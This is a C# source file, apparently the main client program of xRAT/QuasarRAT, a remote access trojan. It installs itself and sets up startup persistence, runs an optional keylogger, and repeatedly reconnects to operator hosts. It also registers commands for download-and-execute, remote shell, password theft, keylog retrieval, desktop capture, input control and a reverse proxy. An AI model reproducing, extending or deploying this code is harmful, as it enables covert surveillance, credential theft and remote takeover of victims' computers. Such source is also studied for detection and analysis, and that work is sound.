using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using xClient.Config;
using xClient.Core;
using xClient.Core.Commands;
using xClient.Core.Data;
using xClient.Core.Encryption;
using xClient.Core.Helper;
using xClient.Core.Networking;
using xClient.Core.Packets;
using xClient.Core.Utilities;

namespace xClient
{
    internal static class Program
    {
        public static Client ConnectClient;
        private static bool _reconnect = true;
        private static volatile bool _connected = false;
        private static Mutex _appMutex;
        private static ApplicationContext _msgLoop;
        private static HostsManager _hosts;

        [STAThread]
        private static void Main(string[] args)
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            Settings.Initialize();
            Initialize();
            if (!SystemCore.Disconnect)
                Connect();

            Cleanup();
        }

        private static void Cleanup()
        {
            CommandHandler.CloseShell();
            if (CommandHandler.StreamCodec != null)
                CommandHandler.StreamCodec.Dispose();
            if (Keylogger.Instance != null)
                Keylogger.Instance.Dispose();
            if (_msgLoop != null)
                _msgLoop.ExitThread();
            if (_appMutex != null)
                _appMutex.Close();
        }

        private static void InitializeClient()
        {
            ConnectClient = new Client();

            ConnectClient.AddTypesToSerializer(new Type[]
            {
                typeof (Core.Packets.ServerPackets.GetAuthentication),
                typeof (Core.Packets.ServerPackets.DoClientDisconnect),
                typeof (Core.Packets.ServerPackets.DoClientReconnect),
                typeof (Core.Packets.ServerPackets.DoClientUninstall),
                typeof (Core.Packets.ServerPackets.DoDownloadAndExecute),
                typeof (Core.Packets.ServerPackets.DoUploadAndExecute),
                typeof (Core.Packets.ServerPackets.GetDesktop),
                typeof (Core.Packets.ServerPackets.GetProcesses),
                typeof (Core.Packets.ServerPackets.DoProcessKill),
                typeof (Core.Packets.ServerPackets.DoProcessStart),
                typeof (Core.Packets.ServerPackets.GetDrives),
                typeof (Core.Packets.ServerPackets.GetDirectory),
                typeof (Core.Packets.ServerPackets.DoDownloadFile),
                typeof (Core.Packets.ServerPackets.DoMouseEvent),
                typeof (Core.Packets.ServerPackets.DoKeyboardEvent),
                typeof (Core.Packets.ServerPackets.GetSystemInfo),
                typeof (Core.Packets.ServerPackets.DoVisitWebsite),
                typeof (Core.Packets.ServerPackets.DoShowMessageBox),
                typeof (Core.Packets.ServerPackets.DoClientUpdate),
                typeof (Core.Packets.ServerPackets.GetMonitors),
                typeof (Core.Packets.ServerPackets.DoShellExecute),
                typeof (Core.Packets.ServerPackets.DoPathRename),
                typeof (Core.Packets.ServerPackets.DoPathDelete),
                typeof (Core.Packets.ServerPackets.DoShutdownAction),
                typeof (Core.Packets.ServerPackets.GetStartupItems),
                typeof (Core.Packets.ServerPackets.DoStartupItemAdd),
                typeof (Core.Packets.ServerPackets.DoStartupItemRemove),
                typeof (Core.Packets.ServerPackets.DoDownloadFileCancel),
                typeof (Core.Packets.ServerPackets.GetKeyloggerLogs),
                typeof (Core.Packets.ServerPackets.DoUploadFile),
                typeof (Core.Packets.ServerPackets.GetPasswords),
                typeof (Core.Packets.ServerPackets.DoLoadRegistryKey),
                typeof (Core.Packets.ClientPackets.GetAuthenticationResponse),
                typeof (Core.Packets.ClientPackets.SetStatus),
                typeof (Core.Packets.ClientPackets.SetStatusFileManager),
                typeof (Core.Packets.ClientPackets.SetUserStatus),
                typeof (Core.Packets.ClientPackets.GetDesktopResponse),
                typeof (Core.Packets.ClientPackets.GetProcessesResponse),
                typeof (Core.Packets.ClientPackets.GetDrivesResponse),
                typeof (Core.Packets.ClientPackets.GetDirectoryResponse),
                typeof (Core.Packets.ClientPackets.DoDownloadFileResponse),
                typeof (Core.Packets.ClientPackets.GetSystemInfoResponse),
                typeof (Core.Packets.ClientPackets.GetMonitorsResponse),
                typeof (Core.Packets.ClientPackets.DoShellExecuteResponse),
                typeof (Core.Packets.ClientPackets.GetStartupItemsResponse),
                typeof (Core.Packets.ClientPackets.GetKeyloggerLogsResponse),
                typeof (Core.Packets.ClientPackets.GetPasswordsResponse),
                typeof (Core.Packets.ClientPackets.GetRegistryKeysResponse),
                typeof (Core.ReverseProxy.Packets.ReverseProxyConnect),
                typeof (Core.ReverseProxy.Packets.ReverseProxyConnectResponse),
                typeof (Core.ReverseProxy.Packets.ReverseProxyData),
                typeof (Core.ReverseProxy.Packets.ReverseProxyDisconnect)
            });

            ConnectClient.ClientState += ClientState;
            ConnectClient.ClientRead += ClientRead;
            ConnectClient.ClientFail += ClientFail;
        }

        private static void Initialize()
        {
            Thread.Sleep(2000);

            AES.PreHashKey(Settings.PASSWORD);
            _hosts = new HostsManager(HostHelper.GetHostsList(Settings.HOSTS));
            SystemCore.OperatingSystem = SystemCore.GetOperatingSystem();
            SystemCore.MyPath = Application.ExecutablePath;
            SystemCore.InstallPath = Path.Combine(Settings.DIR, ((!string.IsNullOrEmpty(Settings.SUBFOLDER)) ? Settings.SUBFOLDER + @"\" : "") + Settings.INSTALLNAME);
            SystemCore.AccountType = SystemCore.GetAccountType();
            GeoLocationHelper.Initialize();

            if (!Settings.INSTALL || SystemCore.MyPath == SystemCore.InstallPath)
            {
                if (!SystemCore.CreateMutex(ref _appMutex))
                    SystemCore.Disconnect = true;

                if (SystemCore.Disconnect)
                    return;

                new Thread(SystemCore.UserIdleThread).Start();

                if (Settings.STARTUP && Settings.INSTALL)
                {
                    SystemCore.AddToStartup();
                }

                InitializeClient();

                if (Settings.ENABLELOGGER)
                {
                    new Thread(() =>
                    {
                        _msgLoop = new ApplicationContext();
                        Keylogger logger = new Keylogger(15000);
                        Application.Run(_msgLoop);
                    }).Start(); ;
                }
            }
            else
            {
                if (!SystemCore.CreateMutex(ref _appMutex))
                    SystemCore.Disconnect = true;

                if (SystemCore.Disconnect)
                    return;

                SystemCore.Install();
            }
        }

        private static void Connect()
        {
            while (_reconnect && !SystemCore.Disconnect)
            {
                if (!_connected)
                {
                    Thread.Sleep(100 + new Random().Next(0, 250));

                    Host host = _hosts.GetNextHost();

                    ConnectClient.Connect(host.Hostname, host.Port);

                    Thread.Sleep(200);

                    Application.DoEvents();
                }

                while (_connected) // hold client open
                {
                    Application.DoEvents();
                    Thread.Sleep(2500);
                }

                if (SystemCore.Disconnect)
                {
                    ConnectClient.Disconnect();
                    return;
                }

                Thread.Sleep(Settings.RECONNECTDELAY + new Random().Next(250, 750));
            }
        }

        public static void Disconnect(bool reconnect = false)
        {
            if (reconnect)
                CommandHandler.CloseShell();
            else
                SystemCore.Disconnect = true;
            ConnectClient.Disconnect();
        }

        private static void LostConnection()
        {
            CommandHandler.CloseShell();
        }

        private static void ClientState(Client client, bool connected)
        {
            if (connected && !SystemCore.Disconnect)
                _reconnect = true;
            else if (!connected && SystemCore.Disconnect)
                _reconnect = false;
            else
                _reconnect = !SystemCore.Disconnect;

            if (_connected != connected && !connected && _reconnect && !SystemCore.Disconnect)
                LostConnection();

            _connected = connected;
        }

        private static void ClientRead(Client client, IPacket packet)
        {
            PacketHandler.HandlePacket(client, packet);
        }

        private static void ClientFail(Client client, Exception ex)
        {
            Debug.WriteLine("Exception Message: " + ex.Message);
            client.Disconnect();
        }
    }
}